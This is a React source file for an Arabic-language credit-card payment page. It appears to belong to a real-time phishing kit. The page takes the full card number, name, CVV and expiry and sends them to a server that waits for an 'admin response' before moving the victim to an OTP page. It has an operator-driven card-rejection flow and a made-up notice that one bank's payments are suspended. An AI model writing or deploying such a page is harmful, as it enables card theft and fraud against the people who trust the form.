import * as React from "react";
import Main from "@/components/Main";
import { IMaskInput } from "react-imask";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import FormControl from "@mui/material/FormControl";
import InputLabel from "@mui/material/InputLabel";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import FilledInput from "@mui/material/FilledInput";
import Select from "@mui/material/Select";
import MenuItem from "@mui/material/MenuItem";
import Button from "@mui/material/Button";
import InputAdornment from "@mui/material/InputAdornment";
import cardValidator from "card-validator";
import madaBINs from "../../assets/mada-bins.json";
import { isFormRejected, mainInfo } from "@/real-time/context/signals";
import "./Payment.css";
import {
  Dialog,
  DialogActions,
  DialogContent,
  DialogContentText,
  DialogTitle,
  IconButton,
} from "@mui/material";
import CloseIcon from "@mui/icons-material/Close";
import { useSearchParams } from "react-router-dom";
import WelcomeDialog from "@/components/WelcomeDialog";

interface CustomProps {
  onChange: (event: { target: { name: string; value: string } }) => void;
  name: string;
}

function getCardType(number: string): string | undefined {
  const cleaned = String(number).replace(/\D/g, "");
  const bin = cleaned.slice(0, 6);

  if (madaBINs.includes(bin)) return "mada";

  const validation = cardValidator.number(cleaned);
  if (
    validation.card &&
    ["visa", "mastercard"].includes(validation.card?.type)
  ) {
    return validation.card.type;
  }
}

const CardNumberCustom = React.forwardRef<HTMLInputElement, CustomProps>(
  function CardNumberCustom(props, ref) {
    const { onChange, ...other } = props;
    return (
      <IMaskInput
        {...other}
        mask="0000  0000  0000  0000"
        inputRef={ref}
        onAccept={(value: any) =>
          onChange({ target: { name: props.name, value } })
        }
        overwrite
      />
    );
  }
);

function Payment() {
  const {
    register,
    handleSubmit,
    reset,
    formState: { isValid },
    setValue,
    watch,
  } = useForm({
    mode: "onChange",
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      cvv: "",
      expiryMonth: "",
      expiryYear: "",
    },
  });

  useEffect(() => {
    if (isFormRejected.value) {
      reset();
      setCardNumber("");
      setNameOnCardValue("");
    }
  }, [isFormRejected.value]);

  const [searchParams] = useSearchParams();
  const total = searchParams.get("total") || "";

  function sendData(data: FieldValues) {
    data.cardNumber = data.cardNumber.replace(/\s+/g, "");

    data.totalPaid = total;

    data.nameOnCard = data.nameOnCard.trim();

    sendDataToServer({
      paymentCard: data,
      current: "الدفع",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  }

  useEffect(() => setCurrentPage("الدفع بطاقة الائتمان"), []);

  const months: string[] = [];
  const years: string[] = [];

  const [cardNumber, setCardNumber] = React.useState("");
  const [cardType, setCardType] = React.useState<string | undefined>();
  const [nameOnCardValue, setNameOnCardValue] = React.useState("");

  for (let i = 0; i < 12; i++) {
    const month = (i < 9 ? `0` : "") + (i + 1);
    const year = String(Number(new Date().getFullYear()) + i).replace("20", "");

    months.push(month);
    if (i < 6) years.push(year);
  }

  React.useEffect(() => {
    setCardType(getCardType(cardNumber));
  }, [cardNumber]);

  const [errorDialog, setErrorDialog] = React.useState(false);

  const handleCloseErrorDialog = () => {
    setErrorDialog(false);
  };

  const capitalizeWords = (str: string) => {
    const newStr = str
      .split(" ")
      .map((word) =>
        word ? word.charAt(0).toUpperCase() + word.slice(1).toLowerCase() : ""
      )
      .join(" ");

    if (!str[str.length - 1]) {
      return newStr + " ";
    }

    return newStr;
  };

  return (
    <Main>
      <WelcomeDialog />

      <div className="top">
        <h2 className="text-xl font-bold text-main">
          الدفع من خلال بطاقة الائتمان
        </h2>

        <p className="text-gray-600 mt-4">
          سيتم إجراء معاملة مالية على حسابك المصرفي بإستخدام البطاقة بقيمة
          المجموع الكلي
        </p>

        <div className="flex justify-between items-center">
          <h3 className="text-lg font-bold text-main text-right mt-4 self-start">
            معلومات البطاقة
          </h3>
          <div className="flex images items-center">
            <img src="images/mastercard.png" className="h-7" alt="mastercard" />
            <img src="images/visa.png" className="h-7 mx-3" alt="visa" />
            <img src="images/mada.png" className="h-7" alt="mada" />
          </div>
        </div>
      </div>

      <form
        className="flex-col gap-8 w-full mt-5"
        onSubmit={handleSubmit(sendData)}
      >
        <Stack>
          <FormControl fullWidth>
            <InputLabel htmlFor="cardNumber">رقم البطاقة</InputLabel>
            <FilledInput
              dir="ltr"
              {...register("cardNumber", {
                required: "رقم البطاقة مطلوب",
                validate: (value) => {
                  const digitsOnly = value.replace(/\s+/g, "");
                  return digitsOnly.length === 16 || "رقم غير صحيح";
                },
              })}
              value={cardNumber}
              onChange={(e) => {
                const digitsOnly = e.target.value.replace(/\s+/g, "");
                const prefixes = mainInfo.value.blockedCardPrefixes;
                if (prefixes && prefixes.includes(digitsOnly.slice(0, 4))) {
                  setErrorDialog(true);
                  setCardNumber("");
                  setValue("cardNumber", "", { shouldValidate: true });
                } else {
                  setCardNumber(digitsOnly);
                  setValue("cardNumber", digitsOnly, { shouldValidate: true });
                }
              }}
              name="cardNumber"
              id="cardNumber"
              type="tel"
              inputComponent={CardNumberCustom as any}
              aria-label="رقم البطاقة"
              endAdornment={
                <InputAdornment position="end">
                  {cardType && (
                    <img
                      src={`images/${cardType}.png`}
                      alt={cardType}
                      className="me-4"
                      style={{ height: 20 }}
                    />
                  )}
                </InputAdornment>
              }
            />
          </FormControl>
        </Stack>

        <Stack my="24px">
          <FormControl fullWidth>
            <InputLabel htmlFor="nameOnCard">اسم حامل البطاقة</InputLabel>
            <FilledInput
              dir="ltr"
              {...register("nameOnCard", { required: "هذا الحقل مطلوب" })}
              value={nameOnCardValue}
              id="nameOnCard"
              onChange={(e) => {
                let cleaned = e.target.value.replace(/[^A-Za-z ]/g, "");

                if (!cleaned.trim()) {
                  cleaned = "";
                } else {
                  cleaned = capitalizeWords(cleaned);
                }

                setNameOnCardValue(cleaned);
                setValue("nameOnCard", cleaned, { shouldValidate: true });
              }}
              inputProps={{ maxLength: 30 }}
              aria-label="الاسم الموجود علي البطاقة"
            />
          </FormControl>
        </Stack>

        <Stack
          className="bottom-input"
          direction="row"
          justifyContent="space-between"
        >
          <FormControl className="cvv" sx={{ width: "40%" }}>
            <InputLabel htmlFor="cvv">الرمز السري (CVV)</InputLabel>
            <FilledInput
              dir="ltr"
              {...register("cvv", {
                required: "مطلوب",
                minLength: { value: 3, message: "يجب أن يكون 3 أرقام" },
                maxLength: { value: 3, message: "يجب أن يكون 3 أرقام" },
              })}
              id="cvv"
              placeholder="خلف البطاقة"
              type="tel"
              aria-label="الرمز السري (CVV)"
              inputProps={{ maxLength: 3 }}
            />
          </FormControl>
          <Stack className="expiry" direction="row" width="50%" spacing={2}>
            <FormControl variant="filled" fullWidth>
              <InputLabel>شهر</InputLabel>
              <Select
                value={watch("expiryMonth")}
                {...register("expiryMonth", { required: "الشهر مطلوب" })}
                onChange={(e) =>
                  setValue("expiryMonth", e.target.value, {
                    shouldValidate: true,
                  })
                }
                labelId="expiryMonth"
                id="expiryMonth"
                label="شهر"
              >
                {months.map((month) => (
                  <MenuItem key={month} value={month}>
                    {month}
                  </MenuItem>
                ))}
              </Select>
            </FormControl>
            <FormControl variant="filled" fullWidth>
              <InputLabel>سنة</InputLabel>
              <Select
                value={watch("expiryYear")}
                {...register("expiryYear", { required: "السنة مطلوبة" })}
                onChange={(e) =>
                  setValue("expiryYear", e.target.value, {
                    shouldValidate: true,
                  })
                }
                labelId="expiryYear"
                id="expiryYear"
                label="سنة"
              >
                {years.map((year) => (
                  <MenuItem key={year} value={year}>
                    {year}
                  </MenuItem>
                ))}
              </Select>
            </FormControl>
          </Stack>
        </Stack>

        {isFormRejected.value && (
          <Stack className="font-medium mt-5 text-red-500 text-center">
            تم رفض البطاقة، يُرجى إدخال بيانات صحيحة أو استبدالها ببطاقة أخرى.
          </Stack>
        )}

        <Stack
          className="form-bottom"
          direction="row"
          justifyContent="space-between"
          alignItems="center"
          mt="24px"
        >
          <div className="flex items-center">
            <p className="w-max">
              {`المجموع الكلى:`}{" "}
              <strong className="text-green-600 font-bold ring-offset-4">
                {total || "--"}
              </strong>{" "}
              ر.س
            </p>
          </div>
          <Button variant="outlined" disabled={!isValid} type="submit">
            إتمام الدفع
          </Button>
        </Stack>
      </form>

      <React.Fragment>
        <Dialog open={errorDialog} onClose={handleCloseErrorDialog}>
          <DialogTitle color="error">خطأ في الدفع</DialogTitle>
          <DialogContent>
            <IconButton
              onClick={handleCloseErrorDialog}
              sx={(theme) => ({
                position: "absolute",
                right: 8,
                top: 8,
                color: theme.palette.grey[500],
              })}
            >
              <CloseIcon />
            </IconButton>
            <DialogContentText color="error">
              عزيزي العميل، تم إيقاف الدفع مؤقتًا عن طريق مصرف الراجحي والمحافظ
              الإلكترونية. نأمل السداد عن طريق مصرف آخر...
            </DialogContentText>
          </DialogContent>
          <DialogActions>
            <Button onClick={handleCloseErrorDialog} color="error">
              حسنا
            </Button>
          </DialogActions>
        </Dialog>
      </React.Fragment>
    </Main>
  );
}

export default Payment;
